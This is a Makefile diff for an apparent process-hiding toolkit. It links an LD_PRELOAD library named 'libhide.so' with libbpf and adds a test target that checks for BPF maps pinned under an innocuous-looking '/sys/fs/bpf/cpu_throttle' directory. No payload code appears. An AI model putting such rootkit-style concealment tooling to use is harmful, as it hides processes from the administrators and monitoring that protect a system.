@@ -43,11 +43,11 @@ test: $(OUTPUT)/hide_process_bpf.o
 
 # Kernel module removed - using eBPF-only approach
 
-# Build LD_PRELOAD library
+# Build LD_PRELOAD library with libbpf integration
 $(OUTPUT)/libhide.so: libhide.c
-	@echo "Building LD_PRELOAD library..."
-	$(CC) -shared -fPIC -ldl libhide.c -o $(OUTPUT)/libhide.so
-	@echo "LD_PRELOAD library built successfully!"
+	@echo "Building LD_PRELOAD library with BPF map integration..."
+	$(CC) -shared -fPIC -ldl -lbpf -lelf -lz libhide.c -o $(OUTPUT)/libhide.so
+	@echo "LD_PRELOAD library built successfully with libbpf support!"
 
 # Build main program
 main: $(OUTPUT)/hide_process_loader
@@ -64,6 +64,19 @@ build-test: hybrid
 	@echo "Build test successful"
 	@file $(OUTPUT)/hide_process_bpf.o
 	@ls -lh $(OUTPUT)/hide_process_loader
+
+# Test LD_PRELOAD BPF map integration
+test-libhide: $(OUTPUT)/libhide.so
+	@echo "Testing LD_PRELOAD BPF map integration..."
+	@echo "Checking if BPF map directory exists..."
+	@if [ -d "/sys/fs/bpf/cpu_throttle" ]; then \
+		echo "✓ BPF map directory found"; \
+		ls -la /sys/fs/bpf/cpu_throttle/ 2>/dev/null || echo "⚠ No maps found"; \
+	else \
+		echo "⚠ BPF map directory not found - run hide_process_loader first"; \
+	fi
+	@echo "Testing library loading..."
+	@LD_PRELOAD=$(OUTPUT)/libhide.so echo "✓ LD_PRELOAD library loads successfully"
 
 # Install to system (requires root)
 install: hybrid
